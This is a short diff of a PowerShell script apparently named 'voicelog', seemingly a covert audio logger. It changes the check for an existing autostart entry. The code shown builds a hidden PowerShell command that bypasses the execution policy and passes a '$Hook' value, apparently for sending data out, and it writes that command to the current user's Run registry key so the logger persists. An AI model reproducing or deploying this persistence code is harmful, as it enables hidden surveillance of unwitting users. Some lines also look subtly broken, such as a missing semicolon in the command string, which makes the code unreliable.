@@ -23,7 +23,7 @@ if(($Persistent -eq $true)){
 }
 
 if($DaysRun -eq -1 -or $DaysRun -gt 0){
-    if($null -ne (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog').Test){ return };
+    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\voicelog'){ return };
 
     $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' -Value $autostart;
